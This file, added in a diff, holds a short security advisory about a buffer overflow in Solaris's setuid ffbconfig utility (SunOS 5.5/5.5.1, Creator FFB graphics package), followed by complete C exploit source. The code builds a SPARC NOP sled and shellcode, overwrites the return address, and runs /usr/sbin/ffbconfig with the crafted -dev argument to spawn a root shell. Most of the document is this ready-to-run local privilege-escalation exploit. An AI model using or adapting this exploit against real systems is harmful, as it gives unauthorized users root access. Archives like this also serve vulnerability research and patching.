@@ -1,0 +1,63 @@
+source: http://www.securityfocus.com/bid/202/info
+
+The ffbconfig program is used to configure the Creator Fast Frame Buffer (FFB) Graphics Accelerator, which is a component of the FFB Configuration Software Package (SUNWffbcf). A buffer overflow condition has been discovered that may allow an unauthorized user to gain root access on the system.The ffbconfig program is used when the FFB Graphics accelerator card is installed. Thus, to test if a system is vulnerable, run the following command to see if the SUNWffbcf package is installed./usr/bin/pkginfo -l SUNWffbcfIf the package is not present, you will receive an error message stating that SUNWffbcf was not found. If it is present, ffbconfig is installed in /usr/sbin.The following versions of SunOS are affected:SunOS versions 5.5.1 and 5.5 SPARC running the Creator FFB Graphics Accelerator. 
+
+/*
+This works on Solaris 2.4 wiz /usr/sbin/ffbconfig from a Solaris 2.5
+*/
+
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+#define BUF_LENGTH      128
+#define EXTRA           256
+#define STACK_OFFSET    128
+#define SPARC_NOP       0xa61cc013
+
+u_char sparc_shellcode[] =
+"\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xda\xdc\xae\x15\xe3\x68"
+"\x90\x0b\x80\x0e\x92\x03\xa0\x0c\x94\x1a\x80\x0a\x9c\x03\xa0\x14"
+"\xec\x3b\xbf\xec\xc0\x23\xbf\xf4\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc"
+"\x82\x10\x20\x3b\x91\xd0\x20\x08\x90\x1b\xc0\x0f\x82\x10\x20\x01"
+"\x91\xd0\x20\x08"
+;
+
+
+u_long get_sp(void)
+{
+  __asm__("mov %sp,%i0 \n");
+}
+
+void main(int argc, char *argv[])
+{
+  char buf[BUF_LENGTH + EXTRA];
+  long targ_addr;
+  u_long *long_p;
+  u_char *char_p;
+  int i, code_length = strlen(sparc_shellcode),so;
+
+  long_p = (u_long *) buf;
+
+  for (i = 0; i < (BUF_LENGTH - code_length) / sizeof(u_long); i++)
+    *long_p++ = SPARC_NOP;
+
+  char_p = (u_char *) long_p;
+
+  for (i = 0; i < code_length; i++)
+    *char_p++ = sparc_shellcode[i];
+
+  long_p = (u_long *) char_p;
+  targ_addr = get_sp() - STACK_OFFSET;
+  for (i = 0; i < EXTRA / sizeof(u_long); i++)
+    *long_p++ =targ_addr;
+
+  printf("Jumping to address 0x%lx B[%d] E[%d] SO[%d]\n",
+targ_addr,BUF_LENGTH,EXTRA,STACK_OFFSET);
+
+  execl("/usr/sbin/ffbconfig", "ffbconfig", "-dev", buf,(char *) 0);
+  perror("execl failed");
+}
